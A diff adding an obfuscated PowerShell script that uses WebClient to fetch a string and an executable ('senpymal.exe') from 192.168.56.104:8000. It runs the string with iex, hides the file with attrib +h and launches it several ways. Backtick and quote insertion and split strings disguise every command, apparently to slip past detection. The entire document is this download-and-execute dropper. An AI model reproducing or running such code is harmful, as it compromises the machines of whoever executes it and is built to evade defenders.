@@ -1,0 +1,18 @@
+$s='gi-ekjf-xsld'; s`E""T-aLI""a`s $s($s[$true-12]+($s[[byte]('0x'+'FF')-264]) + ($s[[byte]('0x'+'9a')-158]));
+
+
+i"W"r ('ht'+'tp://'+'192.168.56.104:8000/senpym"al.ex"e');
+
+
+iex (N`e""W-O""b`jECt N`eT.WEbC`liENt).DoWNlOAdStrinG('ht'+'tp://'+'192.168.56.104:8000/string');
+
+
+iex (N`e""W-O""b`jECt N`eT.WEbC`liENt).DoWNlOAdfILe('ht'+'tp://'+'192.168.56.104:8000/senpym"al.ex"e');
+
+
+attrib +h senpym"al.ex"e;
+
+
+Invoke-Process senpym"al.ex"e;
+ii senpym"al.ex"e;
+start-process senpym"al.ex"e;
